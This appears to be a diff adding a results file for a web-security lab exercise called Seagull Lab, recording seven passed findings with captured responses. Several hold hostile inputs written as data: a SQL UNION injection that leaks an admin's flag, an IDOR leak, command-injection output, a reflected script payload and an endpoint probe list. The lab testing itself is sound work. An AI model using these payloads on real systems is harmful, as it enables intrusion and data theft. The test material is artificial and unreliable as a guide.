@@ -1,0 +1,7 @@
+{"id": "L1", "finding": "IDOR fixture", "response": "{\"id\": 201, \"owner\": \"admin\", \"body\": \"flag{seagull_idor_pwned}\"}", "passed": true}
+{"id": "L2", "finding": "SQL UNION fixture", "response": "{\"sql\": \"SELECT id, owner FROM notes WHERE owner = 'x' UNION SELECT id, body FROM notes WHERE owner='admin' -- '\", \"rows\": [[201, \"flag{seagull_idor_pwned}\"]]}", "passed": true}
+{"id": "L3", "finding": "Server-side self-fetch", "response": "<html><body><h1>Seagull Lab</h1><p>fixture</p></body></html>", "passed": true}
+{"id": "L4", "finding": "Dedicated sample file fetch", "response": "SEAGULL_FIXTURE_FILE_ONLY\r\n", "passed": true}
+{"id": "L5", "finding": "Fixed command injection marker", "response": "{\"out\": \"\\nPinging 127.0.0.1 with 32 bytes of data:\\nReply from 127.0.0.1: bytes=32 time<1ms TTL=128\\n\\nPing statistics for 127.0.0.1:\\n    Packets: Sent = 1, Received = 1, Lost = 0 (0% loss),\\nApproximate round trip times in milli-seconds:\\n    Minimum = 0ms, Maximum = 0ms, Average = 0ms\\nSEAGULL_CMDI_MARKER\\n\"}", "passed": true}
+{"id": "L6", "finding": "JSON reflection only; XSS not established", "response": "{\"sql\": \"SELECT id, owner FROM notes WHERE owner = '<script>alert(1)</script>'\", \"rows\": []}", "passed": true}
+{"id": "L7", "finding": "Exact endpoint discovery", "response": {"api": 404, "admin": 404, "api/note": 404, "api/search": 200, "api/fetch": 403, "api/delete": 404, "backup": 404, ".git": 404, "robots.txt": 404, "api/ping": 200}, "passed": true}
